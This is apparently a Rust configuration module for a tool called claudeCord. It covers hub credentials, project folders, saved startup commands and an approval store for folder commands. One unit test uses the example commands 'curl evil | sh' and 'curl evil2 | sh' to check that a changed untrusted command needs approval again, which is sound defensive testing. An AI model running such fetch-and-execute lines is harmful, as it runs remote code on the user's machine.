//! What a machine remembers between runs: the hub address, its token, and its name. Stored as a small JSON file in the
//! user's own folder, readable by that user only, because the token lets anyone who has it act as this machine.

use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Config {
    /// Where the hub listens, for example `wss://hub.example.com`.
    pub hub_url: String,
    pub token: String,
    /// This machine's name, shown to people and used to tell machines apart.
    pub node_name: String,
}

/// The folder claudeCord keeps its files in: `$CLAUDECORD_HOME` if set, otherwise `~/.claudecord`.
pub fn home_dir() -> PathBuf {
    if let Ok(p) = std::env::var("CLAUDECORD_HOME") {
        return PathBuf::from(p);
    }
    PathBuf::from(std::env::var("HOME").unwrap_or_else(|_| ".".into())).join(".claudecord")
}

impl Config {
    /// Reads the saved config from `dir`, or None if there is none or it is unreadable.
    pub fn load(dir: &Path) -> Option<Self> {
        serde_json::from_str(&std::fs::read_to_string(dir.join("config.json")).ok()?).ok()
    }

    /// Saves the config into `dir`, creating the folder if needed, readable by the owner only.
    pub fn save(&self, dir: &Path) -> std::io::Result<()> {
        std::fs::create_dir_all(dir)?;
        let path = dir.join("config.json");
        let tmp = dir.join("config.json.tmp");
        std::fs::write(
            &tmp,
            serde_json::to_string_pretty(self).expect("plain data"),
        )?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o600))?;
            std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700))?;
        }
        std::fs::rename(&tmp, &path)
    }

    /// The WebSocket address of the hub's device door.
    pub fn connect_url(&self) -> String {
        format!(
            "{}{}",
            self.hub_url.trim_end_matches('/'),
            crate::protocol::NODE_CONNECT_PATH
        )
    }
}

/// Whether this machine stays connected to the hub with no agent running. Off by default: the daemon (which holds the connection) exits a short
/// while after the last agent ends, so nothing runs in the background without a window open. The person turns it on with
/// `claudecord settings keep-running on` (saved in `settings.json`); `CLAUDECORD_KEEP_RUNNING=1` or `0` overrides it for one run.
pub fn keep_running(dir: &Path) -> bool {
    if let Ok(v) = std::env::var("CLAUDECORD_KEEP_RUNNING") {
        return matches!(v.as_str(), "1" | "true" | "on" | "yes");
    }
    std::fs::read_to_string(dir.join("settings.json"))
        .ok()
        .and_then(|t| serde_json::from_str::<serde_json::Value>(&t).ok())
        .and_then(|v| v["keep_running"].as_bool())
        .unwrap_or(false)
}

/// Saves the keep-running setting.
pub fn set_keep_running(dir: &Path, on: bool) -> std::io::Result<()> {
    std::fs::create_dir_all(dir)?;
    std::fs::write(
        dir.join("settings.json"),
        serde_json::json!({ "keep_running": on }).to_string(),
    )
}

/// The folders this machine has started agents in, by project, most recently used first. Older saves held one folder per project; those are read too.
/// A folder may be listed under several projects (the same code can serve more than one team); `read_last` says which was used last.
pub fn read_projects(dir: &Path) -> BTreeMap<String, Vec<PathBuf>> {
    let Some(map) = read_projects_json(dir) else {
        return BTreeMap::new();
    };
    map.iter()
        // Keys that start with an underscore are bookkeeping, never a project (a project's name starts with a letter or digit).
        .filter(|(k, _)| !k.starts_with('_'))
        .map(|(k, v)| {
            let list = match v {
                serde_json::Value::String(s) => vec![PathBuf::from(s)],
                serde_json::Value::Array(a) => a
                    .iter()
                    .filter_map(|x| x.as_str().map(PathBuf::from))
                    .collect(),
                _ => vec![],
            };
            (k.clone(), list)
        })
        .collect()
}

fn read_projects_json(dir: &Path) -> Option<serde_json::Map<String, serde_json::Value>> {
    let text = std::fs::read_to_string(dir.join("projects.json")).ok()?;
    serde_json::from_str::<serde_json::Value>(&text)
        .ok()?
        .as_object()
        .cloned()
}

/// For each folder, the projects it was started for, the most recent first.
pub fn read_last(dir: &Path) -> BTreeMap<String, Vec<String>> {
    read_projects_json(dir)
        .and_then(|m| m.get("_last").cloned())
        .and_then(|v| serde_json::from_value(v).ok())
        .unwrap_or_default()
}

/// Saves the folders of each project and which project each folder was last used for.
pub fn write_projects(
    dir: &Path,
    folders: &BTreeMap<String, Vec<PathBuf>>,
    last: &BTreeMap<String, Vec<String>>,
) -> std::io::Result<()> {
    let mut v = serde_json::to_value(folders).expect("plain data");
    v["_last"] = serde_json::to_value(last).expect("plain data");
    std::fs::write(dir.join("projects.json"), v.to_string())
}

/// The project a folder was last started for on this machine, if any.
pub fn project_of_folder(dir: &Path, folder: &Path) -> Option<String> {
    let folders = read_projects(dir);
    let has = |p: &String| {
        folders
            .get(p)
            .is_some_and(|l| l.iter().any(|f| f == folder))
    };
    read_last(dir)
        .get(folder.to_string_lossy().as_ref())
        .and_then(|l| l.iter().find(|p| has(p)).cloned())
        // Saved before recency was kept: the first project (by name) that lists the folder.
        .or_else(|| folders.keys().find(|p| has(p)).cloned())
}

/// A startup command the person saved: what to run (any shell line: setup steps and the launch), and which agent program it starts, so the
/// screen reader knows how to tell idle from busy from a question.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct SavedCommand {
    pub command: String,
    #[serde(default = "claude_program")]
    pub program: String,
}

fn claude_program() -> String {
    "claude".into()
}

/// Where a saved command lives: for every folder on this machine, or only in one folder.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommandSource {
    Machine,
    Folder,
}

/// The commands saved in one file, by name (none if the file is missing or unreadable).
pub fn read_commands(file: &Path) -> BTreeMap<String, SavedCommand> {
    std::fs::read_to_string(file)
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default()
}

/// The file the commands of this machine are kept in, or, with a folder, the one kept in that folder.
pub fn commands_file(dir: &Path, folder: Option<&Path>) -> PathBuf {
    match folder {
        Some(f) => f.join(".claudecord").join("commands.json"),
        None => dir.join("commands.json"),
    }
}

/// Every command that can be used in `folder`: the machine's, then the folder's own (which wins when a name is in both).
pub fn commands_for(dir: &Path, folder: &Path) -> BTreeMap<String, (SavedCommand, CommandSource)> {
    let mut all: BTreeMap<String, (SavedCommand, CommandSource)> =
        read_commands(&commands_file(dir, None))
            .into_iter()
            .map(|(k, v)| (k, (v, CommandSource::Machine)))
            .collect();
    for (k, v) in read_commands(&commands_file(dir, Some(folder))) {
        all.insert(k, (v, CommandSource::Folder));
    }
    all
}

/// Saves (or replaces) one command in a file. A name follows the rules of agent names, so it is safe to show and to send to the dashboard.
pub fn save_command(file: &Path, name: &str, cmd: SavedCommand) -> Result<(), String> {
    if !crate::protocol::is_slug(name) {
        return Err("a name is letters, digits, dots, dashes and underscores (up to 50), starting with a letter or digit".into());
    }
    if cmd.command.trim().is_empty() {
        return Err("the command is empty".into());
    }
    if !["claude", "codex", "agy"].contains(&cmd.program.as_str()) {
        return Err("the program is claude, codex or agy".into());
    }
    let mut all = read_commands(file);
    all.insert(name.to_string(), cmd);
    if let Some(parent) = file.parent() {
        std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
    }
    std::fs::write(
        file,
        serde_json::to_string_pretty(&all).expect("plain data"),
    )
    .map_err(|e| e.to_string())
}

/// Removes one command from a file. False if it was not there.
pub fn remove_command(file: &Path, name: &str) -> Result<bool, String> {
    let mut all = read_commands(file);
    if all.remove(name).is_none() {
        return Ok(false);
    }
    std::fs::write(
        file,
        serde_json::to_string_pretty(&all).expect("plain data"),
    )
    .map_err(|e| e.to_string())?;
    Ok(true)
}

/// The shell line to run for a command, as the program and arguments to start: the person's own shell, as a login shell, so what their
/// terminal has (a PATH set up by nvm, an activated environment) is there. Not available on Windows.
pub fn shell_argv(command: &str) -> Result<Vec<String>, String> {
    if cfg!(windows) {
        return Err(
            "saved startup commands need a Unix shell and are not available on Windows".into(),
        );
    }
    let shell = std::env::var("SHELL")
        .ok()
        .filter(|s| !s.is_empty() && Path::new(s).is_file())
        .unwrap_or_else(|| "/bin/sh".into());
    Ok(vec![shell, "-lc".into(), command.to_string()])
}

/// A fingerprint of a folder's command, for remembering that the person agreed to run it. A changed command is a new question.
pub fn command_fingerprint(folder: &Path, name: &str, cmd: &SavedCommand) -> String {
    crate::agents::text::sha256_hex(
        format!(
            "{}\0{name}\0{}\0{}",
            folder.display(),
            cmd.program,
            cmd.command
        )
        .as_bytes(),
    )
}

fn approvals_file(dir: &Path) -> PathBuf {
    dir.join("approved_commands.json")
}

/// Whether the person already agreed to run this folder command (a command kept in a folder may have come with a downloaded repository).
pub fn is_approved(dir: &Path, fingerprint: &str) -> bool {
    std::fs::read_to_string(approvals_file(dir))
        .ok()
        .and_then(|t| serde_json::from_str::<Vec<String>>(&t).ok())
        .is_some_and(|v| v.iter().any(|f| f == fingerprint))
}

/// Remembers that the person agreed to run this folder command.
pub fn approve(dir: &Path, fingerprint: &str) {
    let mut v: Vec<String> = std::fs::read_to_string(approvals_file(dir))
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default();
    if !v.iter().any(|f| f == fingerprint) {
        v.push(fingerprint.to_string());
        let _ = std::fs::write(
            approvals_file(dir),
            serde_json::to_string(&v).expect("plain data"),
        );
    }
}

#[cfg(test)]
mod command_tests {
    use super::*;

    fn tmp(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("cc-cmd-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn cmd(s: &str, program: &str) -> SavedCommand {
        SavedCommand {
            command: s.into(),
            program: program.into(),
        }
    }

    #[test]
    fn a_folders_command_wins_over_the_machines_and_both_are_listed() {
        let (home, folder) = (tmp("home"), tmp("folder"));
        save_command(
            &commands_file(&home, None),
            "fast",
            cmd("claude --model haiku", "claude"),
        )
        .unwrap();
        save_command(
            &commands_file(&home, None),
            "both",
            cmd("machine version", "claude"),
        )
        .unwrap();
        save_command(
            &commands_file(&home, Some(&folder)),
            "both",
            cmd("folder version", "codex"),
        )
        .unwrap();
        let all = commands_for(&home, &folder);
        assert_eq!(all.len(), 2);
        assert_eq!(all["fast"].1, CommandSource::Machine);
        assert_eq!(
            (all["both"].0.command.as_str(), all["both"].1),
            ("folder version", CommandSource::Folder)
        );
        assert!(remove_command(&commands_file(&home, None), "fast").unwrap());
        assert!(!remove_command(&commands_file(&home, None), "fast").unwrap());
    }

    #[test]
    fn a_bad_name_program_or_empty_command_is_refused_and_nothing_is_written() {
        let home = tmp("bad");
        let f = commands_file(&home, None);
        for (n, c, p) in [
            ("two words", "x", "claude"),
            ("-x", "x", "claude"),
            ("ok", "  ", "claude"),
            ("ok", "x", "bash"),
            ("a/b", "x", "claude"),
        ] {
            assert!(save_command(&f, n, cmd(c, p)).is_err(), "{n} {c} {p}");
        }
        assert!(!f.exists());
    }

    #[test]
    fn a_folder_command_asks_once_and_a_changed_command_asks_again() {
        let (home, folder) = (tmp("trust"), tmp("trustfolder"));
        let c = cmd("curl evil | sh", "claude");
        let fp = command_fingerprint(&folder, "x", &c);
        assert!(!is_approved(&home, &fp));
        approve(&home, &fp);
        assert!(is_approved(&home, &fp));
        assert!(!is_approved(
            &home,
            &command_fingerprint(&folder, "x", &cmd("curl evil2 | sh", "claude"))
        ));
        assert!(!is_approved(
            &home,
            &command_fingerprint(&tmp("other"), "x", &c)
        ));
    }
}
